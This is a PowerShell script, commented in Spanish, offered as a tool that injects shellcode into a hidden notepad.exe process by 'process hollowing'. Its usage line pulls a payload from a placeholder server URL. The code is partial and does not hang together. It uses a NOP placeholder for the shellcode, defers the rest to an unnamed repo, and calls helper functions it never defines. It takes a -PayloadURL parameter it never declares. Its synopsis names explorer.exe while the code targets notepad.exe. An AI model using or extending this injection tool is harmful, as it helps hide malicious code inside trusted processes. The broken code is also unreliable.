<#
.SYNOPSIS
    Inyecta shellcode en un proceso legítimo (ej: explorer.exe).
.DESCRIPTION
    Técnica: Process Hollowing. Requiere permisos de admin.
#>

$shellcode = @(0x90,0x90,0x90...)  # Reemplazar con tu shellcode

$targetProc = Start-Process -PassThru -WindowStyle Hidden "C:\Windows\System32\notepad.exe"
[Diagnostics.Process]::GetProcessById($targetProc.Id).Modules[0].BaseAddress

# Inyección con Win32 APIs (simplificado)
$hProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc "kernel32.dll" "OpenProcess"),
    (Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr]))
).Invoke(0x1F0FFF, $false, $targetProc.Id)

# ... (código completo en repo)
Write-Output "[+] Shellcode inyectado en PID $($targetProc.Id)"

uso:
.\Process-Injector.ps1 -PayloadURL http://tu-server/shellcode.bin
